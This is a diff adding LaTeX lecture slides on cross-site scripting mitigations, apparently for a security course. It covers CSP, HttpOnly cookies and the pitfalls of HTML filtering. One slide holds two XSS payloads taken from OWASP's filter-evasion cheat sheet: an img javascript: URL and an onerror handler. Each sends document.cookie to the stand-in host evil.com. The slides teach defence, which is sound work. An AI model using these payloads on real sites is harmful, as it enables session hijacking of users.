@@ -1,0 +1,55 @@
+
+\section{XSS mitigations}
+
+\begin{frame}<1-2>[label=XSSmits]{XSS mitigations}
+    \begin{itemize}
+    \item host dangerous stuff on different domain
+        \begin{itemize}
+        \item has different cookies
+        \end{itemize}
+    \item Content-Security-Policy
+        \begin{itemize}
+        \item server says ``browser, don't run scripts here''
+        \end{itemize}
+    \item \myemph<3>{HttpOnly cookies}
+        \begin{itemize}
+        \item server says ``browser, don't share this with code on the page''
+        \end{itemize}
+    \item \myemph<2>{filter/escape inputs} (same as normal command injection)
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=HTMLFilterEscapeNits]{HTML filtering/escaping nits}
+    \begin{itemize}
+    \item it's easy to mess up HTML filtering or escaping
+        \begin{itemize}
+        \item (especially if trying to allow ``safe HTML'')
+        \item browsers have features you don't know about
+        \end{itemize}
+    \item can `only' set image URL?
+\begin{minted}[fontsize=\fontsize{10}{11}]{HTML}
+<img src="javascript:(new Image()).src=
+                     'http://evil.com/' + document.cookie">
+\end{minted}
+    \item disallow the word `script'?
+\begin{minted}[fontsize=\fontsize{10}{11}]{HTML}
+<img src=x onerror="(new Image()).src=
+                   'http://evil.com/' + document.cookie">
+\end{minted}
+
+    \end{itemize}
+            \imagecredit{via \url{https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet}}
+\end{frame}
+
+\againframe<3>{XSSmits}
+
+\begin{frame}<1-2>[label=HTTPOnlyCookie]{HTTP-only cookies}
+    \begin{itemize}
+    \item \texttt{Set-Cookie: SessionID=123456789; HttpOnly}
+    \item ``only send cookie in HTTP''
+    \item cookie is \myemph{not available to JS}
+    \item eliminates obvious way of exploiting XSS
+    \item problem: \myemph<2>{JS can read webpage contents}
+    \end{itemize}
+\end{frame}
+
